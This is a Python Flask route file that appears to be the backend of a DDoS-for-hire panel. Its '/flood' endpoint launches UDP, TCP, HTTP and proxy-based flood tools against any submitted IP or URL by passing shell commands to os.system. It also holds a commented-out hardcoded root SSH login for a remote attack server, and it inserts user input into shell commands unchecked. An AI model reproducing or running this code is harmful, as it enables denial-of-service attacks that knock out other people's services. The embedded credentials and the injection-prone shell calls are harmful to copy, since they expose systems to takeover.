import validation, datetime, paramiko
from flask import * 
from routes.decorators import RouteDecorators
from urllib.parse import urlparse

from funcs.string import str_equals, is_str_empty, sanitize

from funcs.validator import Validation

Flood = Blueprint("Flood", __name__)

@Flood.route("/flood", methods=["GET"])
@RouteDecorators.log
@RouteDecorators.discord_webbhook_log
@RouteDecorators.admin_key_required
def flood():

    if 'target' in request.args and 'port' in request.args and 'time' in request.args and 'method' in request.args:
        target = sanitize(request.args.get('target', default=None, type=str))
        port = sanitize(request.args.get('port', default=None, type=str))
        time = sanitize(request.args.get('time', default=None, type=str))
        method = sanitize(request.args.get('method', default=None, type=str))
    else:
        return jsonify({
            "response_code": 101,
            "response_message": "Missing argument(s)."
        })

    if not all([target, port, time, method]):
        return jsonify({
            "response_code": 102,
            "response_message": "Missing argument(s). Null values."
        })
    
    if Validation.ip_list_blacklist(target):
        return jsonify({
                "response_code": 102,
                "response_message": "Target is blacklisted by ip address."
            })


    # big fucking validation block here... just dont change it .... 
    # this is to be updated... code is a bit ugly... definitly not my proudest validation.
    if not Validation.validate_ip(target):
        if not Validation.validate_url(target):
            return jsonify({
                "response_code": 102,
                "response_message": "Target is not an Ipv4 or an URL."
            })
        else:
            screen_name = urlparse(target).netloc # get the domain name out of the url and use it as the screen instance name
    else:
        screen_name = target # if its an ip just keep it that way for the screen name
        

    if not Validation.validate_port(port):
        return jsonify({
                "response_code": 102,
                "response_message": "Port should be in the range of (1-65535)."
            })

    if not Validation.validate_time(time):
        return jsonify({
                "response_code": 102,
                "response_message": "Time should be MIN=10, MAX=14400."
            }) 

    try:     

        screen_name = urlparse(target).netloc
        screen_cmd = f"screen -dm -S {screen_name} timeout {time}"

        # add ya own shit... and can you see any if-elif-elif-elif.. ;)
        print(target)

        if method == "BROWSER":
            cmd = f"chmod +x * && {screen_cmd} ./d {target} {time} 50 proxy.txt 384"

        if method == "POWER":
            cmd = f"chmod +x * && {screen_cmd} ./d {target} {time} 70 proxy.txt 512"

        if method == "HTTP-RAW":
            cmd = f"chmod +x * && {screen_cmd} node HTTP-RAW.js {target} {time}"

        if method == "UDP":
            cmd = f"chmod +x * && {screen_cmd} ./UDPBYPASS {target} {port}"

        if method == "TCP":
            cmd = f"chmod +x * && {screen_cmd} ./UDPBYPASS {target} {port}"

        if method == "PACKETS":
            cmd = f"chmod +x * && {screen_cmd} python3 packets.py {target} {port}"

        os.system(f"{cmd}")

        # client = paramiko.SSHClient()
        # client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # client.connect("193.42.36.184", port=56777, username="root", password="39WoIZeN421lItjF0h") # рауль
        # stdin, stdout, stderr = client.exec_command(f"{cmd}")

        return jsonify({
            "response_code": 105,
            "response_message": "Flood started.",
            "time": datetime.datetime.now()
        })

    except paramiko.BadAuthenticationType:
        return jsonify({
            "response_code": 106,
            "response_message": "Bad authentication type error.",
        })

    except paramiko.BadHostKeyException:
        return jsonify({
            "response_code": 107,
            "response_message": "Bad Host key error.",
        })

    except paramiko.PasswordRequiredException:
        return jsonify({
            "response_code": 108,
            "response_message": "PasswordRequired error.",
        })

    except paramiko.SSHException:
        return jsonify({
            "response_code": 109,
            "response_message": "SSH2  error.",
        })

    except: # return diffent codes for ??
        return jsonify({
            "response_code": 110,
            "response_message": "SSH client uncaught error.",
        })


    
        
